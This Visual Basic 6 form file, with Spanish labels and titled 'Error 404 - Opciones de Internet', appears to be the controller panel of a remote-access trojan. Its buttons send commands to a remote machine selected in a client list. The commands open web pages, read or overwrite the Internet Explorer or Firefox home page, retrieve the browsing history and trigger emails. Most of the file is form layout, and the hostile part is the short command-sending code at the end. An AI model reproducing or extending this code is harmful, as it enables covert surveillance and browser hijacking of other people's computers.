VERSION 5.00
Begin VB.Form frmNETOptions 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404 - Opciones de Internet"
   ClientHeight    =   6735
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   6375
   Icon            =   "frmNETOptions.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6735
   ScaleWidth      =   6375
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame fraNET 
      BackColor       =   &H00FFFFFF&
      Height          =   2655
      Index           =   3
      Left            =   120
      TabIndex        =   14
      Top             =   3960
      Width           =   6135
      Begin VB.CommandButton cmdLog 
         Caption         =   "Ver Historial"
         Height          =   315
         Left            =   2400
         TabIndex        =   16
         Top             =   2280
         Width           =   1335
      End
      Begin VB.TextBox txtLog 
         Height          =   1845
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   15
         Top             =   360
         Width           =   5895
      End
      Begin VB.Label lblNET 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Historial de paginas Web"
         Height          =   195
         Index           =   3
         Left            =   2160
         TabIndex        =   17
         Top             =   120
         Width           =   1770
      End
   End
   Begin VB.Frame fraNET 
      BackColor       =   &H00FFFFFF&
      Height          =   1095
      Index           =   2
      Left            =   120
      TabIndex        =   9
      Top             =   2760
      Width           =   6135
      Begin VB.TextBox txtSendEmail 
         Height          =   285
         Left            =   120
         TabIndex        =   11
         Text            =   "correo@hotmail.com"
         Top             =   360
         Width           =   5895
      End
      Begin VB.CommandButton cmdSendEmail 
         Caption         =   "Enviar E-Mail"
         Height          =   315
         Left            =   2400
         TabIndex        =   10
         Top             =   720
         Width           =   1335
      End
      Begin VB.Label lblNET 
         AutoSize        =   -1  'True
         Caption         =   "Enviar E-Mail"
         Height          =   195
         Index           =   2
         Left            =   2640
         TabIndex        =   12
         Top             =   120
         Width           =   930
      End
   End
   Begin VB.Frame fraNET 
      BackColor       =   &H00FFFFFF&
      Height          =   1335
      Index           =   1
      Left            =   120
      TabIndex        =   5
      Top             =   1320
      Width           =   6135
      Begin VB.TextBox txtHomeWeb 
         Height          =   285
         Left            =   120
         TabIndex        =   7
         Top             =   360
         Width           =   5895
      End
      Begin VB.CommandButton cmdSetHomeWeb 
         Caption         =   "Escoger Web"
         Height          =   315
         Left            =   3240
         TabIndex        =   13
         Top             =   840
         Width           =   1335
      End
      Begin VB.CommandButton cmdGetHomeWeb 
         Caption         =   "Ver Web"
         Height          =   315
         Left            =   1800
         TabIndex        =   8
         Top             =   840
         Width           =   1335
      End
      Begin VB.Frame fraNET 
         BackColor       =   &H00FFFFFF&
         Height          =   680
         Index           =   4
         Left            =   0
         TabIndex        =   18
         Top             =   600
         Width           =   1695
         Begin VB.OptionButton optFirefox 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Mozilla Firefox"
            Height          =   255
            Left            =   120
            TabIndex        =   20
            Top             =   360
            Width           =   1335
         End
         Begin VB.OptionButton optIE 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Internet Explorer"
            Height          =   255
            Left            =   120
            TabIndex        =   19
            Top             =   120
            Value           =   -1  'True
            Width           =   1455
         End
      End
      Begin VB.Label lblNET 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         BackStyle       =   0  'Transparent
         Caption         =   "Pagina de inico"
         Height          =   195
         Index           =   0
         Left            =   2520
         TabIndex        =   6
         Top             =   120
         Width           =   1095
      End
   End
   Begin VB.Frame fraNET 
      BackColor       =   &H00FFFFFF&
      Height          =   1095
      Index           =   0
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   6135
      Begin VB.CommandButton cmdOpenPage 
         Caption         =   "Abrir Web"
         Height          =   315
         Left            =   2400
         TabIndex        =   4
         Top             =   720
         Width           =   1335
      End
      Begin VB.TextBox txtOpenPage 
         Height          =   285
         Left            =   120
         TabIndex        =   3
         Text            =   "http://www.google.com/"
         Top             =   360
         Width           =   5895
      End
      Begin VB.Label lblNET 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Abrir pagina Web"
         Height          =   195
         Index           =   1
         Left            =   2520
         TabIndex        =   2
         Top             =   120
         Width           =   1230
      End
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   1920
      Top             =   7440
   End
   Begin VB.TextBox value 
      Height          =   495
      Left            =   360
      TabIndex        =   0
      Top             =   7440
      Width           =   615
   End
End
Attribute VB_Name = "frmNETOptions"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Private Sub cmdGetHomeWeb_Click()
If optIE.value = True Then Send "GetHomeIE" Else Send "GetHomeFirefox"
End Sub

Private Sub cmdLog_Click()
Send "WebLog"
End Sub

Private Sub cmdOpenPage_Click()
Send "OpenPage|" & txtOpenPage.Text
End Sub

Private Sub cmdSendEmail_Click()
Send "SendEmail|" & txtSendEmail.Text
End Sub

Private Sub cmdSetHomeWeb_Click()
If optIE.value = True Then Send "SetHomeIE|" & txtHomeWeb.Text Else Send "SetHomeFirefox|" & txtHomeWeb.Text
End Sub

Private Sub Form_Load()
On Error Resume Next
Me.Caption = "Opciones de Internet - Error 404 [" & Form1.LV.SelectedItem & "]"
End Sub

Public Function ShellExecLaunchFile(ByVal strPathFile As String, ByVal strOpenInPath As String, ByVal strArguments As String) As Long
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
ShellExecLaunchFile = ShellExecute(Scr_hDC, "Open", strPathFile, "", strOpenInPath, SW_SHOWNORMAL)
End Function
